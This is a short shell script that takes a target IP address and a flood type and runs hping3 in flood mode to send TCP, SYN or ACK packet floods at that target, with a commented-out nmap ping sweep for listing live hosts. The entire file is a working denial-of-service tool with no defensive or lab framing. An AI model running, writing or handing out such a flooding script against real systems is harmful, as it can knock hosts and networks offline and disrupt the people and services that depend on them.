#!/bin/sh
IPaddr=$1
type_of_flood=$2
#list_of_IPs=`nmap -sP $1 -oG - | grep "Host:" | awk '{print $2}'`


if [ -z "$IPaddr" ]; then 
echo "Usage: "$0" IPaddr type_of_flood"
exit
fi
if [ -z "$type_of_flood" ]; then
echo "Usage: "$0" IPaddr type_of_flood"
exit
fi

if [ $type_of_flood = 'tcp' ]; then
sudo hping3 --faster --flood $IPaddr
else
 if [ $type_of_flood = "syn" ]; then
sudo hping3 --syn --faster --flood $IPaddr
else
 if [ $type_of_flood = "ack" ]; then
sudo hping3 --ack --faster --flood $IPaddr
fi
fi
fi
exit

